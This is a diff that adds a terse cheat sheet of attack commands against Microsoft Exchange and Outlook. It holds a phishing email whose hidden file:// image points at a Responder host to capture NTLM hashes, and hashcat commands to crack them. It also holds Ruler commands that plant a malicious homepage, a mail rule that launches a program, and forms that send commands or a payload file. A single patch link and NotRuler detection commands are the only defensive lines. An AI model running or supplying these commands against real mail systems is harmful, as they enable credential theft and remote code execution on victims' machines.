@@ -1,0 +1,49 @@
+-- User Credentials Harvesting
+
+sendemail -s <smtp server ip:25> -f <email from user> -t <email to user> -u Picture -m "Hey Dud, <img src='file://<ip of responder>/pictures/logo.jpg' alt='Loading' height='1' width='1'>" -o tls=no message-content-type=html
+
+responder -b -A -I eth0 -v
+
+--Hashcat to crack the hash
+
+hashcat -m 5600 hash.txt pass.txt -o cracknew.txt --force
+
+
+--Homepage Attack
+
+./ruler-linux64 --domain <domain name> --username <username> --password <password> --email <email id> --rpc --url https://<webmail url>/autodiscover/autodiscover.xml -k --nocache --verbose homepage add --url http://<server ip>/outlook.html
+
+--Mitigation
+Apply Patch for CVE-2017-11774 (KB4011162)
+https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11774
+
+
+--Malicious Rule Attack
+
+./ruler-linux64 --domain <domain name> --username <username> --password <password> --email <email id> --rpc --url https://<webmail url>/autodiscover/autodiscover.xml -k --nocache --verbose add --location "C:\Windows\System32\calc.exe" --trigger "popacalc" --name maliciousrule
+
+
+
+--Forms 
+
+./ruler-linux64 --domain <domain name> --username <username> --password <password> --email <email id> --rpc --url https://<webmail url>/autodiscover/autodiscover.xml -k --nocache --verbose form send --suffix demo
+
+./ruler-linux64 --domain <domain name> --username <username> --password <password> --email <email id> --rpc --url https://<webmail url>/autodiscover/autodiscover.xml -k --nocache --verbose form add --suffix demo --command "MsgBox(\"hello\")" --send
+
+
+
+./ruler-linux64 --domain <domain name> --username <username> --password <password> --email <email id> --rpc --url https://<webmail url>/autodiscover/autodiscover.xml -k --nocache --verbose form add --suffix demo --input /root/payload.txt --send
+
+
+------------ Not Ruler ------------------
+
+Rules
+./notruler --username <email id> --mailbox <target email id> --self rules
+
+Homepage
+./notruler --username <email id> --mailbox <target email id>--self homepage
+
+Forms
+./notruler --username <email id> --mailbox <target email id> --self forms
+
+
